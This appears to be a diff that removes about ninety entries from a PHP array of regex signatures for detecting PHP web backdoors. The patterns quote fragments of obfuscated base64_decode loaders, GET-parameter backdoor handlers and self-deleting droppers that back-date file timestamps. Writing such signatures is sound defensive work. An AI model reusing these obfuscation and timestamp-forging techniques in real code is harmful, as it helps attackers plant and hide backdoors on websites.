-      'pattern' => '/\\<\\?php \\$fgdrspkz\\=str_ireplace\\("z","","zzzbzzzzzzazzzszzzzezzzzz6zzzz4zzzzz_zzzdzzzzezzzzczzzzzozzzzdzzzez"\\); \\$bxqtb\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    312 => 
-    array (
-      'pattern' => '/LypwcHR1Y3BmZXEqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lyp6/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    313 => 
-    array (
-      'pattern' => '/\\<\\?php echo "CSYGDSrZrt"; if \\(file_exists\\("\\.\\/admin_awards\\.php"\\)\\)\\{ touch\\("\\.\\/admin_awards\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*D/',
-      'label' => 'source-file tail snippet',
-    ),
-    314 => 
-    array (
-      'pattern' => '/\\<\\?php echo "cAkDwsWZDW"; if \\(file_exists\\("\\.\\/meinedaten\\.php"\\)\\)\\{ touch\\("\\.\\/meinedaten\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*e3zpy/',
-      'label' => 'source-file tail snippet',
-    ),
-    315 => 
-    array (
-      'pattern' => '/\\<\\?php \\$tfutw\\=str_ireplace\\("q","","qqqbqqqqaqqqqsqqqqqqeqqqqq6qqqqqq4qqqqq_qqqqdqqqeqqqcqqqqoqqqdqqqqeqqq"\\); \\$pgcbam\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    316 => 
-    array (
-      'pattern' => '/LypnbXljd2N1c3VyYWUqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    317 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wnxdd\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$evhaqzpx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/',
-      'label' => 'source-file tail snippet',
-    ),
-    318 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ztzxbffby\\=str_ireplace\\("x","","xbxxxaxxsxxxexxx6xxxxxx4xxxx_xxxxdxxxxxexxxxxcxxxxxxoxxxxxdxxxxexx"\\); \\$uvgdqkwrqh\\="DQoJCUBlcnJvcl9yZXB/',
-      'label' => 'source-file tail snippet',
-    ),
-    319 => 
-    array (
-      'pattern' => '/\\<\\?php \\$rzyeqhwv\\=str_ireplace\\("k","","kkkbkkkkakkkkskkkkkekkkk6kkkkkk4kkkkk_kkdkkkkkekkkkkckkkkokkkkkkdkkkkkekk"\\); \\$nzbzs\\="DQoJCUBlcnJvcl9yZX/',
-      'label' => 'source-file tail snippet',
-    ),
-    320 => 
-    array (
-      'pattern' => '/\\<\\?php echo "NzQCXmpDhY"; if \\(file_exists\\("\\.\\/init\\.tongue\\.php"\\)\\)\\{ touch\\("\\.\\/init\\.tongue\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*H2Y/',
-      'label' => 'source-file tail snippet',
-    ),
-    321 => 
-    array (
-      'pattern' => '/Lyp2YWR5eGZnZG1tKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkpey8q/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    322 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mpaevpq\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$cgcwf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
-      'label' => 'source-file tail snippet',
-    ),
-    323 => 
-    array (
-      'pattern' => '/\\<\\?php echo "RqQsGVRrKy"; if \\(file_exists\\("\\.\\/staff\\-login\\.php"\\)\\)\\{ touch\\("\\.\\/staff\\-login\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*9Kt/',
-      'label' => 'source-file tail snippet',
-    ),
-    324 => 
-    array (
-      'pattern' => '/Lypoa3J3ZnJrciovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKnJr/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    325 => 
-    array (
-      'pattern' => '/\\<\\?php \\$vkcyaecxa\\=str_ireplace\\("t","","ttbttttattttstttettt6ttttt4tttt_tttttdtttetttttcttttottttdttttettt"\\); \\$srkvktfv\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    326 => 
-    array (
-      'pattern' => '/\\<\\?php \\$vcehpv\\=str_ireplace\\("u","","uubuuuauuusuuuueuuuu6uuuu4uuuu_uuuuduuuuueuucuuuuouuuduuuuueuuu"\\); \\$rqayk\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    327 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xnfvqeepxg\\=str_ireplace\\("y","","yybyyyyayyyysyyyyeyyyy6yyy4yyyyyy_yydyyyyyeyyyyycyyyyoyydyyyyyyeyy"\\); \\$xmddydsvdh\\="DQoJCUBlcnJvcl9yZX/',
-      'label' => 'source-file tail snippet',
-    ),
-    328 => 
-    array (
-      'pattern' => '/\\<\\?php \\$hthfug\\=str_ireplace\\("p","","ppbpppapppspppppepp6pppp4ppp_pppppdppppeppppppcppppopppppdpppppep"\\); \\$fsewr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    329 => 
-    array (
-      'pattern' => '/\\<\\?php \\$sbszcckrde\\=str_ireplace\\("k","","kbkkkkakkkkkkskkekkkk6kk4kkkkk_kkkdkkkekkkkckkkokkkkdkkkkkek"\\); \\$pfruv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
-      'label' => 'source-file tail snippet',
-    ),
-    330 => 
-    array (
-      'pattern' => '/\\<\\?php \\$shxhrqqy\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$uhvucqe\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    331 => 
-    array (
-      'pattern' => '/\\<\\?php echo "FsCaEtMxFe"; if \\(file_exists\\("\\.\\/config\\.deer\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.deer\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Q3Z/',
-      'label' => 'source-file tail snippet',
-    ),
-    332 => 
-    array (
-      'pattern' => '/\\<\\?php \\$pcgchmqed\\=str_ireplace\\("w","","wwwbwwawwwwwswwwwewwww6www4wwww_wwwwdwwwwwewwwwwcwwwwwowwwdwweww"\\); \\$ruztct\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    333 => 
-    array (
-      'pattern' => '/\\<\\?php echo "fdXtaBdKBD"; if \\(file_exists\\("\\.\\/tellafriend\\.php"\\)\\)\\{ touch\\("\\.\\/tellafriend\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*fct/',
-      'label' => 'source-file tail snippet',
-    ),
-    334 => 
-    array (
-      'pattern' => '/\\<\\?php echo "ceUhsXeEss"; if \\(file_exists\\("\\.\\/details\\.php"\\)\\)\\{ touch\\("\\.\\/details\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*zKWU93uMU6v/',
-      'label' => 'source-file tail snippet',
-    ),
-    335 => 
-    array (
-      'pattern' => '/\\<\\?php echo "rrxaShzfnw"; if \\(file_exists\\("\\.\\/currency\\.php"\\)\\)\\{ touch\\("\\.\\/currency\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*9x6pRPcG2/',
-      'label' => 'source-file tail snippet',
-    ),
-    336 => 
-    array (
-      'pattern' => '/\\<\\?php \\$stqwzzzspp\\=str_ireplace\\("i","","iiibiiiiaiiiisiiieiiii6iii4iiii_iiidiiiiiieiiiiiciiiiioiiiiiidiiieiii"\\); \\$qmmcz\\="DQoJCUBlcnJvcl9yZXBv/',
-      'label' => 'source-file tail snippet',
-    ),
-    337 => 
-    array (
-      'pattern' => '/\\<\\?php \\$msbddanq\\=str_ireplace\\("q","","qbqqqqqqaqqqqsqqeqq6qqqq4qqqq_qqqqqdqqqeqqqcqqqqoqqqdqqqqeq"\\); \\$ftufx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/',
-      'label' => 'source-file tail snippet',
-    ),
-    338 => 
-    array (
-      'pattern' => '/\\* @package    win\\.error\\.Libraries[\\s\\S]{0,12000}@session_start                          \\(\\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    339 => 
-    array (
-      'pattern' => '/\\)
-
-
-; 
-\\}
-set_exception_handler               \\([\\s\\S]{0,160}\\]     \\(\\$_POST                              \\[/',
-      'label' => 'sample-specific literal chain',
-    ),
-    340 => 
-    array (
-      'pattern' => '/\\<\\?php \\$skgkh\\=str_ireplace\\("z","","zbzzzazzzszzzzzzezzzzz6zz4zzzz_zzzzzdzzzzzezzzzzczzzzozzzzdzzzzez"\\); \\$bebsm\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
-      'label' => 'source-file tail snippet',
-    ),
-    341 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mcsxmr\\=str_ireplace\\("m","","mmbmmmmmmammmmsmmmmemmmmm6mmmmm4mmmm_mmmdmmmmmmemmmmmmcmmmmommmdmmmemmm"\\); \\$yfuwxrcvy\\="DQoJCUBlcnJvcl9yZX/',
-      'label' => 'source-file tail snippet',
-    ),
-    342 => 
-    array (
-      'pattern' => '/\\<\\?php \\$eeyttpvxft\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$vxqsy\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    343 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xsxhvz\\=str_ireplace\\("r","","rbrrrrarrrrsrrrrerrrrrr6rrrrrr4rrrrr_rrrrdrrrrrerrrrrrcrrrrrorrrrrrdrrrrerr"\\); \\$zzfmn\\="DQoJCUBlcnJvcl9yZX/',
-      'label' => 'source-file tail snippet',
-    ),
-    344 => 
-    array (
-      'pattern' => '/\\<\\?php \\$dqnmye\\=str_ireplace\\("q","","qbqqqqqqaqqsqqqqqqeqqqqq6qqqqqq4qqq_qqqdqqqqeqqcqqqqoqqqqdqqqqeq"\\); \\$tbzsdpzr\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    345 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ktefambp\\=str_ireplace\\("p","","pbppppappppsppppepppp6pppp4pp_ppdpppppepppcppoppdppppppep"\\); \\$ktbxsq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
-      'label' => 'source-file tail snippet',
-    ),
-    346 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ytpgctvzzw\\=str_ireplace\\("n","","nnbnnnnnannnnnsnnnnnnennnn6nnnnn4nnn_nnnndnnnennncnnnnonnnndnnnenn"\\); \\$wfedca\\="DQoJCUBlcnJvcl9yZXBvcn/',
-      'label' => 'source-file tail snippet',
-    ),
-    347 => 
-    array (
-      'pattern' => '/\\<\\?php \\$kauuzhwhh\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$sxqyrce\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    348 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ssddyuvcwh\\=str_ireplace\\("y","","ybyyyyayyyysyyyyeyyy6yyyyy4yyy_yyyydyyeyyyycyyoyyyydyyyyyey"\\); \\$dpktd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    349 => 
-    array (
-      'pattern' => '/\\<\\?php \\$pcnrnpyg\\=str_ireplace\\("r","","rrrbrrrrarrrrsrrrrerrrrr6rrrrr4rr_rrrrrrdrrrrerrrrcrrrrorrrrrdrrrer"\\); \\$rvnmsn\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    350 => 
-    array (
-      'pattern' => '/\\<\\?php \\$qytnbkt\\=str_ireplace\\("h","","hbhhahhhshhhhehhhh6hhhh4hhhh_hhhhdhhhhehhhchhhhohhhhhdhheh"\\); \\$krmdadgfr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    351 => 
-    array (
-      'pattern' => '/\\<\\?php \\$sxckrgva\\=str_ireplace\\("p","","ppbpppapppspppppepp6pppp4ppp_pppppdppppeppppppcppppopppppdpppppep"\\); \\$ghdcuatbct\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    352 => 
-    array (
-      'pattern' => '/\\<\\?php echo "gQfbrPhZZn"; if \\(file_exists\\("\\.\\/sad_api\\.php"\\)\\)\\{ touch\\("\\.\\/sad_api\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*D9KwFmgatQQ/',
-      'label' => 'source-file tail snippet',
-    ),
-    353 => 
-    array (
-      'pattern' => '/\\<\\?php \\$aqzkcm\\=str_ireplace\\("y","","yybyyyyayyysyyyeyyy6yyyyy4yyyyy_yyyyydyyyyyyeyyyyyycyyoyyyydyyyyey"\\); \\$nagthydmq\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    354 => 
-    array (
-      'pattern' => '/\\<\\?php \\$nxgsraw\\=str_ireplace\\("k","","kkkbkkkakkkkskkkkkkekkkk6kkkk4kk_kkkkkkdkkkkkekkkkckkkkokkkkkdkkkkkkekkk"\\); \\$hwgkskx\\="DQoJCUBlcnJvcl9yZX/',
-      'label' => 'source-file tail snippet',
-    ),
-    355 => 
-    array (
-      'pattern' => '/LypucHpzaGFoZCovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKnRy/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    356 => 
-    array (
-      'pattern' => '/\\<\\?php \\$rgequzw\\=str_ireplace\\("h","","hhbhhhhhahhhhhshhhehh6hh4hhhh_hhhhhdhhhehhhhchhohhhhhhdhhheh"\\); \\$bagzuw\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
-      'label' => 'source-file tail snippet',
-    ),
-    357 => 
-    array (
-      'pattern' => '/\\<\\?php echo "kWhCwSFXCA"; if \\(file_exists\\("\\.\\/mail_a_friend\\.php"\\)\\)\\{ touch\\("\\.\\/mail_a_friend\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\//',
-      'label' => 'source-file tail snippet',
-    ),
-    358 => 
-    array (
-      'pattern' => '/\\<\\?php \\$pacwdvsa\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$fkamwkq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    359 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mvddvs\\=str_ireplace\\("n","","nnbnnnnnannnnnsnnnnnnennnn6nnnnn4nnn_nnnndnnnennncnnnnonnnndnnnenn"\\); \\$prqpx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    360 => 
-    array (
-      'pattern' => '/LypjbnpkZ3NweXJyd2tkKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    361 => 
-    array (
-      'pattern' => '/\\<\\?php echo "dmqrmkUrwB"; if \\(file_exists\\("\\.\\/webservice\\.php"\\)\\)\\{ touch\\("\\.\\/webservice\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*MMv9F/',
-      'label' => 'source-file tail snippet',
-    ),
-    362 => 
-    array (
-      'pattern' => '/\\<\\?php echo "xzvFuucsfD"; if \\(file_exists\\("\\.\\/conversationLib\\.php"\\)\\)\\{ touch\\("\\.\\/conversationLib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__/',
-      'label' => 'source-file tail snippet',
-    ),
-    363 => 
-    array (
-      'pattern' => '/\\<\\?php echo "HhwFFKQCrS"; if \\(file_exists\\("\\.\\/site_search\\.php"\\)\\)\\{ touch\\("\\.\\/site_search\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*nMT/',
-      'label' => 'source-file tail snippet',
-    ),
-    364 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ggscqvf\\=str_ireplace\\("h","","hhbhhahhhhshhhhhehhh6hhhh4hhhh_hhhhhdhhhehhhhhchhohhhhhhdhhhehhh"\\); \\$npnmdezrf\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    365 => 
-    array (
-      'pattern' => '/\\<\\?php \\$swfmw\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$pqyssv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc2/',
-      'label' => 'source-file tail snippet',
-    ),
-    366 => 
-    array (
-      'pattern' => '/\\<\\?php \\$vxuqchd\\=str_ireplace\\("h","","hhbhhhhahhhhhshhhehh6hhhh4hhhhh_hhhhhhdhhhhhehhhhchhohhhhdhhhhehhh"\\); \\$nxuudqz\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    367 => 
-    array (
-      'pattern' => '/\\);\\$msfmzxwv\\=\\$svetucby\\(\\$tmydg\\);user_error\\(\\$msfmzxwv,E_USER_ERROR\\);
-
-\\/\\/ Set the root path as a constant\\.
-if \\(\\!defined\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    368 => 
-    array (
-      'pattern' => '/LypxdXp0dG1mKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkpey8qc3d6/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    369 => 
-    array (
-      'pattern' => '/\\<\\?php \\$vzccqf\\=str_ireplace\\("g","","ggbgggggagggsggggggegg6ggg4gggg_ggggdggggeggggcgggggogggggdgggggegg"\\); \\$hanpwerxgh\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    370 => 
-    array (
-      'pattern' => '/\\);\\$thnpsa\\=\\$tzzzzubcat\\(\\$uzrmnyzxkqy\\);user_error\\(\\$thnpsa,E_USER_ERROR\\);
-
-\\/\\/ Set the root path as a constant\\.
-if \\(\\!defined\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    371 => 
-    array (
-      'pattern' => '/\\<\\?php \\$kmenwhk\\=str_ireplace\\("h","","hhhbhhhhhhahhshhhhhhehhh6hhhhh4hhh_hhhdhhhhehhhchhhhohhhhhdhhhheh"\\); \\$skxawd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    372 => 
-    array (
-      'pattern' => '/\\<\\?php \\$dfmmsdkup\\=str_ireplace\\("y","","ybyyyyyayyyysyyyeyyyy6yyy4yyyyy_yyyydyyyeyyyyycyyyyyyoyyyydyyyyey"\\); \\$evtka\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    373 => 
-    array (
-      'pattern' => '/LypzZ3ZwcGViZ3Znc3h2Ki8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    374 => 
-    array (
-      'pattern' => '/\\<\\?php \\$uvpkynr\\=str_ireplace\\("x","","xbxxxxaxxxxxsxxxxexxxx6xxx4xxxx_xxxxxdxxxxxexxxxcxxxoxxxxxdxxxxexx"\\); \\$fzurxbp\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    375 => 
-    array (
-      'pattern' => '/\\<\\?php \\$qqsnkkwfy\\=str_ireplace\\("p","","pbppppappsppeppppp6ppp4ppp_pppdpppppepppcpppppoppppdpppep"\\); \\$apxcups\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
-      'label' => 'source-file tail snippet',
-    ),
-    376 => 
-    array (
-      'pattern' => '/\\<\\?php \\$fvbcvkfwhc\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$kdzydxm\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/',
-      'label' => 'source-file tail snippet',
-    ),
-    377 => 
-    array (
-      'pattern' => '/Lyp4bW1ma3MqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lyp0d21k/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    378 => 
-    array (
-      'pattern' => '/\\<\\?php \\$kgffe\\=str_ireplace\\("h","","hhbhhhhhahhhhhshhhehh6hh4hhhh_hhhhhdhhhehhhhchhohhhhhhdhhheh"\\); \\$phntbsxqv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    379 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mnppafyu\\=str_ireplace\\("x","","xxxbxxxxaxxxxxsxxxxexxx6xx4xxxx_xxxxxxdxxxxexxcxxxxxoxxxxdxxxxex"\\); \\$fcscxnkw\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    380 => 
-    array (
-      'pattern' => '/\\<\\?php echo "aVxDHwAFcp"; if \\(file_exists\\("\\.\\/class\\.hurry\\.php"\\)\\)\\{ touch\\("\\.\\/class\\.hurry\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*HeR/',
-      'label' => 'source-file tail snippet',
-    ),
-    381 => 
-    array (
-      'pattern' => '/60" \\/\\>\\<br \\/\\>\';
-	\\} else \\{
-		\\$site_domain \\= preg_replace\\( \'\\|\\^www\\\\\\.\\|\', \'\', \\$current_network\\-\\>domain \\);
-		echo \'\\<input name\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    382 => 
-    array (
-      'pattern' => '/\\<\\?php \\$hhdxb\\=str_ireplace\\("u","","ubuuuuauuuuusuuuuueuuu6uu4uuuuu_uuduuuueuuucuuuuouuuuduuuueuu"\\); \\$ygsckd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/',
-      'label' => 'source-file tail snippet',
-    ),
-    383 => 
-    array (
-      'pattern' => '/\\<\\?php \\$vnbvw\\=str_ireplace\\("w","","wwbwwwwwwawwwwwswwewwwww6wwww4www_wwdwwewwcwwwwwowwwdwwwwewww"\\); \\$fqhmhsrau\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
-      'label' => 'source-file tail snippet',
-    ),
-    384 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mzsvvkr\\=str_ireplace\\("t","","ttbttttattttstttettt6ttttt4tttt_tttttdtttetttttcttttottttdttttettt"\\); \\$sepkmysdn\\="DQoJCUBlcnJvcl9yZXBvcn/',
-      'label' => 'source-file tail snippet',
-    ),
-    385 => 
-    array (
-      'pattern' => '/\\<\\?php \\$zhfmhuk\\=str_ireplace\\("y","","yybyyyyayyysyyyeyyy6yyyyy4yyyyy_yyyyydyyyyyyeyyyyyycyyoyyyydyyyyey"\\); \\$qxpndevvmx\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    386 => 
-    array (
-      'pattern' => '/\\<\\?php \\$thhhsvbhb\\=str_ireplace\\("p","","pbppppappspppeppppp6pppp4ppppp_pppppdppppepppppcpppopppdpppppeppp"\\); \\$zkdmbs\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    387 => 
-    array (
-      'pattern' => '/Lypnc3lwY2tidXN5d3ZoKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    388 => 
-    array (
-      'pattern' => '/\\<\\?php \\$zhpzkgbzp\\=str_ireplace\\("x","","xbxxxxaxxxxxsxxxxexxxx6xxx4xxxx_xxxxxdxxxxxexxxxcxxxoxxxxxdxxxxexx"\\); \\$yadwakdbud\\="DQoJCUBlcnJvcl9yZXB/',
-      'label' => 'source-file tail snippet',
-    ),
-    389 => 
-    array (
-      'pattern' => '/\\<\\?php echo "QKNZXvNUFR"; if \\(file_exists\\("\\.\\/clear_skin_1\\.php"\\)\\)\\{ touch\\("\\.\\/clear_skin_1\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4/',
-      'label' => 'source-file tail snippet',
-    ),
-    390 => 
-    array (
-      'pattern' => '/\\<\\?php \\$yaurhu\\=str_ireplace\\("h","","hbhhahhhshhhhehhhh6hhhh4hhhh_hhhhdhhhhehhhchhhhohhhhhdhheh"\\); \\$ukzutqzq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/',
-      'label' => 'source-file tail snippet',
-    ),
-    391 => 
-    array (
-      'pattern' => '/\\<\\?php echo "xuUKwPXSPp"; if \\(file_exists\\("\\.\\/confirm\\.php"\\)\\)\\{ touch\\("\\.\\/confirm\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*dCtaeBTsNu2/',
-      'label' => 'source-file tail snippet',
-    ),
-    392 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ayetmppft\\=str_ireplace\\("q","","qbqqqqqqaqqqqsqqqqeqqq6qqqqq4qq_qqqqqdqqqqeqqqqqqcqqqoqqqqqqdqqqqqeqq"\\); \\$vawtdad\\="DQoJCUBlcnJvcl9yZXB/',
-      'label' => 'source-file tail snippet',
-    ),
-    393 => 
-    array (
-      'pattern' => '/\\<\\?php \\$dsbqqb\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$vcvtrrssf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    394 => 
-    array (
-      'pattern' => '/\\<\\?php echo "tcXvNqkrPe"; if \\(file_exists\\("\\.\\/foreign\\.init\\.php"\\)\\)\\{ touch\\("\\.\\/foreign\\.init\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*1/',
-      'label' => 'source-file tail snippet',
-    ),
-    395 => 
-    array (
-      'pattern' => '/\\<\\?php \\$pzfkxw\\=str_ireplace\\("k","","kkbkkkakkkkskkekkkkk6kkk4kkkkk_kkkkdkkkekkkkkkckkkkkokkkdkkkkekkk"\\); \\$gmxfgm\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    396 => 
-    array (
-      'pattern' => '/\\<\\?php \\$chgfezzr\\=str_ireplace\\("v","","vbvvvvavvvvvsvvvvvevvv6vvv4vvv_vvvvvdvvvvevvvvcvvvovvvvvdvvev"\\); \\$htygdge\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    397 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mkaqnkd\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$dchbnrwysv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/',
-      'label' => 'source-file tail snippet',
-    ),
-    398 => 
-    array (
-      'pattern' => '/\\<\\?php \\$zymqhvkbpk\\=str_ireplace\\("p","","pbppppappppsppppepppppp6ppp4ppppp_pppdpppppepppcpppopppppdppppepp"\\); \\$dheybs\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    399 => 
-    array (
